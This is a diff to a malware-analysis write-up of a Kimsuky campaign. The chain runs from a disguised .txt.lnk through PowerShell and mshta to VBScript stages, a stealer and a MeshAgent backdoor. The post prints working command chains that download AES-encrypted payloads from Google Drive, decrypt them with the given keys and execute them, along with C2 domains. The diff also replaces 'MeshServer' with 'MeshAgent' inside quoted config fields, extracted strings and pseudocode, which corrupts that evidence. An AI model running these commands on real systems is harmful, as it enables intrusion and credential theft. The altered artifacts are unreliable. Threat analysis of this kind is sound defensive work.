@@ -1,5 +1,5 @@
 ﻿---
-title: "Kimsuky A Stealer With MeshServer"
+title: "Kimsuky A Stealer With MeshAgent"
 date: 2026-05-29
 categories: [Malware Analysis]
 tags: [Malware Analysis]
@@ -12,11 +12,13 @@ The analyzed artifact is a ZIP-delivered Windows shortcut downloader masqueradin
 
 The sample targets Microsoft Windows hosts with PowerShell and MSHTML execution support. The initial local evidence confirms an execution chain from the LNK to PowerShell and then to `mshta.exe` with an HTTPS callback to `link24[.]kr`., later retrieved stages provide the native loader, infostealer, keylogger, and MeshAgent.
 
-This specific Kimsuky malware variant utilizes a MeshServer framework to establish communication with its Command and Control (C2) infrastructure and exfiltrate targeted files.
+This specific Kimsuky malware variant utilizes the MeshAgent framework to establish communication with its Command and Control (C2) infrastructure and exfiltrate targeted files. This behavior aligns closely with the attack patterns observed across other variants within the same malware family.
+
+For comparison, the diagram below illustrates the workflow of a Kimsuky variant documented last year.
 
 ![](https://logpresso.com/media/en/2025-09-22-kimsuky-attack/diagram_1.png)
 
-> Image source: [Cyber Threat Analysis] Kimsuky attack disguised as sex offender notification | LogPresso. Logpresso. https://logpresso.com/en/blog/2025-09-22-kimsuky-attack. Published September 22, 2025.
+> Image source: [Cyber Threat Analysis] Kimsuky attack disguised as sex offender notification. https://logpresso.com/en/blog/2025-09-22-kimsuky-attack. Published September 22, 2025.
 
 ## 2. Static Analysis
 
@@ -72,21 +74,21 @@ Decoded UTF-16LE payload:
 ### Execution Flow
 
 1. User opens `[non-ASCII].txt.lnk`, likely believing it is a text file due to the `.txt.lnk` double-extension pattern and `imageres.dll` text-file icon metadata.
-1. Explorer invokes the LNK target:
+2. Explorer invokes the LNK target:
 
 ```
 explorer.exe
   -> powershell.exe -e <Base64 UTF-16LE command>
 ```
 
-1. PowerShell decodes and executes:
+3. PowerShell decodes and executes:
 
 ```
 mshta https://link24.kr/1y0mZTc
 ```
 
-1. `mshta.exe` initiates an HTTPS request to `link24.kr` over TCP/443 and attempts to retrieve remote HTA, HTML, scriptlet, or script content.
-1. If the remote resource is active and returns executable script, `mshta.exe` may execute JScript/VBScript in-process, instantiate COM objects, launch additional LOLBins, or download a second-stage payload.
+4. `mshta.exe` initiates an HTTPS request to `link24.kr` over TCP/443 and attempts to retrieve remote HTA, HTML, scriptlet, or script content.
+5. If the remote resource is active and returns executable script, `mshta.exe` may execute JScript/VBScript in-process, instantiate COM objects, launch additional LOLBins, or download a second-stage payload.
 
 ### Process Tree Hypothesis
 
@@ -104,7 +106,7 @@ The local execution logic is contained in the LNK metadata and PowerShell argume
 
 Reconstructed launcher pseudocode:
 
-```
+```c
 int on_lnk_open(void) {
     ShellExecuteW(
         NULL,
@@ -133,7 +135,7 @@ Transport:        TLS over TCP/443
 
 ---
 
-## 5. Continuation: Retrieved VBScript Stage `pwko.vba`
+## 5. Continuation: Retrieved VBScript Stage pwko.vba
 
 ### Scope
 
@@ -158,11 +160,7 @@ ss = ss & chr(3966404/CLng("&Hbaac"))
 Set oShell = CreateObject(ss)
 ```
 
-Static deobfuscation resolves `ss` at line 16 to:
-
-```
-WScript.shell
-```
+Static deobfuscation resolves `ss` at line 16 to: `WScript.shell`
 
 The script then invokes `WScript.Shell.Run` and `WScript.Shell.Exec` to drive `cmd.exe`, `curl.exe`, `sc.exe`, `powershell.exe`, and `rundll32.exe`.
 
@@ -174,31 +172,31 @@ The script then invokes `WScript.Shell.Run` and `WScript.Shell.Exec` to drive `c
 cmd /c cd /d %temp% && curl -L -o password.txt "https://drive.google.com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ" && password.txt
 ```
 
-1. Query Microsoft Defender service state:
+2. Query Microsoft Defender service state:
 
 ```
 cmd /c sc query WinDefend
 ```
 
-1. If the `WinDefend` query output contains `STOPPED`, download `user.txt`:
+3. If the `WinDefend` query output contains `STOPPED`, download `user.txt`:
 
 ```
 cmd /c cd /d %localappdata% && curl -L -o user.txt "https://drive.google.com/uc?export=download&id=1x9mkl4q9ZU8_hDPNF5w0Mu8ePxVWI5VJ"
 ```
 
-1. Download, decrypt, and execute DLL payload:
+4. Download, decrypt, and execute DLL payload:
 
 ```
 cmd /c cd /d %localappdata% && curl -L -o sys.log "https://drive.google.com/uc?export=download&id=116azn_9bUov3mkSORbPk8_4zIVVNBHZn" && powershell -Command "[System.IO.File]::WriteAllBytes('sys.dll', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('sys.log'), 0, [System.IO.File]::ReadAllBytes('sys.log').Length))" && del sys.log && rundll32 sys.dll,k
 ```
 
-1. Download, decrypt, expand, and execute PowerShell payload:
+5. Download, decrypt, expand, and execute PowerShell payload:
 
 ```
 cmd /c cd /d %localappdata% && curl -L -o pipe.log "https://drive.google.com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew" && powershell -Command "[System.IO.File]::WriteAllBytes('pipe.zip', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('pipe.log'), 0, [System.IO.File]::ReadAllBytes('pipe.log').Length))" && del pipe.log && powershell Expand-Archive -Path pipe.zip && del pipe.zip
 ```
 
-1. Execute extracted PowerShell script:
+6. Execute extracted PowerShell script:
 
 ```
 cmd /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
@@ -295,7 +293,7 @@ This decodes and executes `1.log` or `2.log`. Static decoding produced `decoded_
 
 ![](https://www.notion.so/image/attachment%3Ae0dba281-ddfb-4453-8583-cc80e7b57339%3Aimage.png?table=block&id=36f26e60-5e7e-8095-a361-f54e718a6c56&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)
 
-## 9. Native DLL Stage: `sys.dll`
+## 9. Native DLL Stage: sys.dll
 
 ### PE Characteristics
 
@@ -614,7 +612,7 @@ https://lutkdd.corpsecs.com/<UUID>/appkey
 
 The operator tasking model therefore uses Google Drive for staged payload hosting and `lutkdd.corpsecs.com` for victim registration, exfiltration, polling, file transfer, and command execution.
 
-## 14. Native Plugin: `appload.dll`
+## 14. Native Plugin: appload.dll
 
 ### PE Characteristics
 
@@ -705,7 +703,7 @@ The full C2 protocol can now be concretely resolved:
 
 ---
 
-## 16. Continuation: Auxiliary Payloads Referenced by `appload.dll`
+## 16. Continuation: Auxiliary Payloads Referenced by appload.dll
 
 ### Scope
 
@@ -717,7 +715,7 @@ Three additional payload blobs referenced by `appload.dll` were retrieved and pl
 
 All three artifacts are high-entropy opaque blobs. The AES-CBC key/IV used for prior stages did not successfully decrypt these files. Static assessment is therefore limited to file identity, entropy, header bytes, correlation with `appload.dll` strings, and inferred runtime handling by the native plugin.
 
-## 17. `appload.dll` Decompilation Notes
+## 17. appload.dll Decompilation Notes
 
 ### Exported Entry
 
@@ -821,7 +819,7 @@ void export_z(void) {
 }
 ```
 
-### Correlation With `appload.dll`
+### Correlation With appload.dll
 
 `appload.dll` contains the three Google Drive IDs and staging strings:
 
@@ -1000,7 +998,7 @@ NtQuerySystemInformation
 
 Decompiler-level behavior is consistent with a Chromium/App-Bound helper:
 
-```
+```c
 int sub_140001F30() {
     BrowserTarget targets[] = {
         { "chrome", "C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe",
@@ -1034,7 +1032,7 @@ High-confidence observations:
 
 Analyst interpretation: this stage is likely intended to assist with Chromium App-Bound encryption bypass/decryption or key extraction, complementing the earlier PowerShell credential theft logic.
 
-## 21. `msh.txt` Reverse/Config Notes
+## 21. msh.txt Reverse/Config Notes
 
 `msh.txt` is a MeshAgent configuration/profile file. It is plaintext and starts with MeshCentral-style fields:
 
@@ -1043,7 +1041,7 @@ MeshName=mycoms
 MeshType=2
 MeshID=0xAFC6ADEAE42BE9C75274C0F6DC503464C6F4FB6D6B77521A6B46AA9CAD91FBBA03D0E6B38F5D5BEADA64E2682C3301B8
 ServerID=5A93B1A29F38C43CA42FED5728745C081D04C8390C54525545E10FDECE40C6FCF39941AE33F1C852A596B4418E6CD078
-MeshServer=wss://googleoba.servequake.com:8443/agent.ashx
+MeshAgent=wss://googleoba.servequake.com:8443/agent.ashx
 InstallFlags=2
 ```
 
@@ -1066,10 +1064,10 @@ mesh_name   = parse_value(mesh_config, "MeshName");
 mesh_type   = parse_value(mesh_config, "MeshType");
 mesh_id     = parse_value(mesh_config, "MeshID");
 server_id   = parse_value(mesh_config, "ServerID");
-server_url  = parse_value(mesh_config, "MeshServer");
+server_url  = parse_value(mesh_config, "MeshAgent");
 
 if (server_url == NULL) {
-    fail("MeshServer URI not found");
+    fail("MeshAgent URI not found");
 }
 
 connect_control_channel(server_url, mesh_id, server_id);
@@ -1079,7 +1077,7 @@ The `ServerID` value is used by MeshAgent to pin/validate the MeshCentral server
 
 ![](https://www.notion.so/image/attachment%3A0f83b555-f53f-426d-ace4-57f035be0c45%3Aimage.png?table=block&id=36f26e60-5e7e-80be-9000-c77b482330c5&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)
 
-## 22. `agent.dll` Reverse/Decompiler Notes
+## 22. agent.dll Reverse/Decompiler Notes
 
 `agent.dll` is a full MeshCentral/MeshAgent binary. It is large, statically rich, and includes MeshAgent core strings, compressed JavaScript modules, TLS/certificate logic, service management, and KVM/remote desktop capability.
 
@@ -1097,11 +1095,11 @@ High-signal strings:
 ```
 MeshAgent
 MeshCentral
-MeshServer
+MeshAgent
 Mesh Agent
 Control Channel Connection Established
 No MeshCentral settings found, place .msh file with this executable and restart.
-agentcore: MeshServer URI not found
+agentcore: MeshAgent URI not found
 wss://swarm.meshcentral.com:443/agent.ashx
 wss://meshcentral.com:443/agent.ashx
 KVM Session Ending
@@ -1130,14 +1128,14 @@ The agent's control-flow aligns with standard MeshAgent behavior:
 
 ![](https://www.notion.so/image/attachment%3A60b1e33b-82d9-4d02-8b69-64e07a01503c%3Aimage.png?table=block&id=36f26e60-5e7e-80c7-a5a3-c989dbe01d1c&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)
 
-```
+```c
 int agent_main(int argc, char **argv) {
     initialize_runtime();
     initialize_crypto();
     initialize_networking();
 
     config = load_mesh_settings_from_msh_or_database();
-    if (!config.MeshServer) {
+    if (!config.MeshAgent) {
         log("No MeshCentral settings found, place .msh file with this executable and restart.");
         return ERROR_NO_CONFIG;
     }
@@ -1146,7 +1144,7 @@ int agent_main(int argc, char **argv) {
     verify_or_pin_mesh_server_id(config.ServerID);
 
     while (true) {
-        status = connect_control_channel(config.MeshServer);
+        status = connect_control_channel(config.MeshAgent);
         if (status == CONNECTED) {
             run_meshcore();
             handle_commands();
@@ -1267,7 +1265,7 @@ This section covers the recovered native PE artifacts:
 | BaseReloc | `0x00032000` | `0x500` |
 | IAT | `0x00020000` | `0x370` |
 
-## 25. `sys.dll` Decompilation Notes
+## 25. sys.dll Decompilation Notes
 
 ### Exported Entry
 
